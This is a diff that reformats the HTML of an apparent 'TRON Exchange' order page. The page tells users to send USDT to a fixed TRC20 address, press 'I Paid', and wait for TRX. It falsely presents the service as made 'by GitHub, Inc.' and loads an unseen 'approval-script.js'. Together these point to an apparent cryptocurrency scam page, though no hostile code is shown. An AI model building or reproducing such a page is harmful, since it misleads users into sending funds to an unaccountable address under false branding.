@@ -1,1 +1,95 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Order detail</title><meta name="description" content="TRON Exchange - a fast, secure, and user-friendly platform for converting USDT to TRX with 24/7 availability and privacy-focused services."><link rel="icon" href="/github-mark/github-mark-white.svg" type="image/x-icon"><link rel="stylesheet" href="styles.css"><link rel="stylesheet" href="adaptive-styles.css"></head><body><header><div class="container"><div class="logo" onclick='location.href="https://tron-exchange.github.io/"'><img src="/tron-logo.png" alt="TRON Logo"><h1>TRON Exchange</h1></div><div class="menu-toggle" id="menu-toggle"><div></div><div></div><div></div></div><nav id="nav-menu"><a href="index.html">Exchange</a><a href="about.html">About Us</a><a href="rules.html">Service Rules</a><a href="terms-and-conditions.html">Terms & Conditions</a><a href="contact.html">Contact</a></nav></div></header><main><section class="container-one"><div class="big-text-box"><h2 id="order-number"></h2><p class="description-text">Your exchange is almost complete! Please review the instructions below to finalize the process. If you encounter any issues, feel free to contact our support team. Thank you for choosing to work with us!</p></div><div></div></section><section id="exchange" class="container exchange-container"><div class="give-section"><div class="currency-box give-box"><label>Amount to Send:</label><hr><div class="currency-select"><img src="/tether.png" alt="Tether Icon" class="currency-icon"><label id="result-usdt">00.000 USDT</label></div><p class="description-text">Tether TRC20</p></div></div><div class="get-section"><div class="currency-box"><label>Amount to Receive:</label><hr><div class="currency-select"><img src="/tron.png" alt="TRON Icon" class="currency-icon-two"><label id="result-trx">00.000 TRX</label></div><p class="description-text">TRON TRX</p></div></div></section><section class="container-exchange"><h3>Transfer the specified amount of USDT to the address below. You can either copy the address or simply scan the QR code.</h3><div class="trx-data-container"><div class="trx-qr-container"><div class="trx-qr-box"><img src="/qrcode.png" alt="QR Code" class="trx-qr-code"></div></div><div class="trx-address-container"><div class="trx-address-box"><input type="text" id="trx-address" value="TSXA1nNei6LWe4yL7dV8srH1MgUsMog6W7" readonly="readonly"><button class="trx-copy-btn" id="trx-copy-btn"><img class="copy-img" src="copy.png" alt="Copy"></button></div><div class="trx-paid-btn-container"><button class="trx-exchange-btn-paid" id="paidBtn">I Paid</button></div></div></section><section id="rules" class="container"><h2 style="text-align:left">Exchange Conditions</h2><hr><p class="description-text-1">You're almost done with your exchange! Please read the instructions below carefully. If you encounter any issues, feel free to contact our support team at any time.</p><br><p class="description-text-1"><strong>To complete the exchange:</strong></p><br><p class="description-text-1">1. Double-check that your address and the exchange amount are correct.</p><br><p class="description-text-1">2. Transfer the exact amount of funds using the TRC20 network to the address provided above. It's important to send the precise amount, otherwise, the transaction may not be processed.</p><br><p class="description-text-1">3. Once the funds are sent, the system will automatically verify your transaction. If everything is correct, the exchange will be completed, and your funds will be sent back to you immediately.</p></section></main><footer><div class="container"><p class="footer-text"><img class="img-footer" src="/github-mark/github-mark-grey.svg">© 2023-2024 TRON Exchange by GitHub, Inc.<a href="#rules">Service rules</a><a href="#rules">Terms and Conditions</a><a href="support@tron-exchange.github.io">support@tron-exchange.github.io</a></p></div></footer><div id="overlay"><div id="overlayContent"><button id="closeBtn" class="close-btn">&times;</button><h2>Payment in Progress</h2><p id="countdown"></p><p id="funds-received-message">When funds are received, you will automatically get your TRX.</p><p>For any support, contact:<a href="support@tron-exchange.github.io">support@tron-exchange.github.io</a></p></div></div><script src="script.js"></script><script src="approval-script.js"></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <title>Order detail</title>
+      <meta name="description" content="TRON Exchange - a fast, secure, and user-friendly platform for converting USDT to TRX with 24/7 availability and privacy-focused services.">
+      <link rel="icon" href="/github-mark/github-mark-white.svg" type="image/x-icon">
+      <link rel="stylesheet" href="styles.css">
+      <link rel="stylesheet" href="adaptive-styles.css">
+   </head>
+   <body>
+      <header>
+         <div class="container">
+            <div class="logo" onclick='location.href="https://tron-exchange.github.io/"'>
+               <img src="/tron-logo.png" alt="TRON Logo">
+               <h1>TRON Exchange</h1>
+            </div>
+            <div class="menu-toggle" id="menu-toggle">
+               <div></div>
+               <div></div>
+               <div></div>
+            </div>
+            <nav id="nav-menu"><a href="index.html">Exchange</a><a href="about.html">About Us</a><a href="rules.html">Service Rules</a><a href="terms-and-conditions.html">Terms & Conditions</a><a href="contact.html">Contact</a></nav>
+         </div>
+      </header>
+      <main>
+         <section class="container-one">
+            <div class="big-text-box">
+               <h2 id="order-number"></h2>
+               <p class="description-text">Your exchange is almost complete! Please review the instructions below to finalize the process. If you encounter any issues, feel free to contact our support team. Thank you for choosing to work with us!</p>
+            </div>
+            <div></div>
+         </section>
+         <section id="exchange" class="container exchange-container">
+            <div class="give-section">
+               <div class="currency-box give-box">
+                  <label>Amount to Send:</label>
+                  <hr>
+                  <div class="currency-select"><img src="/tether.png" alt="Tether Icon" class="currency-icon"><label id="result-usdt">00.000 USDT</label></div>
+                  <p class="description-text">Tether TRC20</p>
+               </div>
+            </div>
+            <div class="get-section">
+               <div class="currency-box">
+                  <label>Amount to Receive:</label>
+                  <hr>
+                  <div class="currency-select"><img src="/tron.png" alt="TRON Icon" class="currency-icon-two"><label id="result-trx">00.000 TRX</label></div>
+                  <p class="description-text">TRON TRX</p>
+               </div>
+            </div>
+         </section>
+         <section class="container-exchange">
+            <h3>Transfer the specified amount of USDT to the address below. You can either copy the address or simply scan the QR code.</h3>
+            <div class="trx-data-container">
+            <div class="trx-qr-container">
+               <div class="trx-qr-box"><img src="/qrcode.png" alt="QR Code" class="trx-qr-code"></div>
+            </div>
+            <div class="trx-address-container">
+               <div class="trx-address-box"><input type="text" id="trx-address" value="TSXA1nNei6LWe4yL7dV8srH1MgUsMog6W7" readonly="readonly"><button class="trx-copy-btn" id="trx-copy-btn"><img class="copy-img" src="copy.png" alt="Copy"></button></div>
+               <div class="trx-paid-btn-container"><button class="trx-exchange-btn-paid" id="paidBtn">I Paid</button></div>
+            </div>
+         </section>
+         <section id="rules" class="container">
+            <h2 style="text-align:left">Exchange Conditions</h2>
+            <hr>
+            <p class="description-text-1">You're almost done with your exchange! Please read the instructions below carefully. If you encounter any issues, feel free to contact our support team at any time.</p>
+            <br>
+            <p class="description-text-1"><strong>To complete the exchange:</strong></p>
+            <br>
+            <p class="description-text-1">1. Double-check that your address and the exchange amount are correct.</p>
+            <br>
+            <p class="description-text-1">2. Transfer the exact amount of funds using the TRC20 network to the address provided above. It's important to send the precise amount, otherwise, the transaction may not be processed.</p>
+            <br>
+            <p class="description-text-1">3. Once the funds are sent, the system will automatically verify your transaction. If everything is correct, the exchange will be completed, and your funds will be sent back to you immediately.</p>
+         </section>
+      </main>
+      <footer>
+         <div class="container">
+            <p class="footer-text"><img class="img-footer" src="/github-mark/github-mark-grey.svg">© 2023-2024 TRON Exchange by GitHub, Inc.<a href="#rules">Service rules</a><a href="#rules">Terms and Conditions</a><a href="support@tron-exchange.github.io">support@tron-exchange.github.io</a></p>
+         </div>
+      </footer>
+      <div id="overlay">
+         <div id="overlayContent">
+            <button id="closeBtn" class="close-btn">&times;</button>
+            <h2>Payment in Progress</h2>
+            <p id="countdown"></p>
+            <p id="funds-received-message">When funds are received, you will automatically get your TRX.</p>
+            <p>For any support, contact:<a href="support@tron-exchange.github.io">support@tron-exchange.github.io</a></p>
+         </div>
+      </div>
+      <script src="script.js"></script><script src="approval-script.js"></script>
+   </body>
+</html>
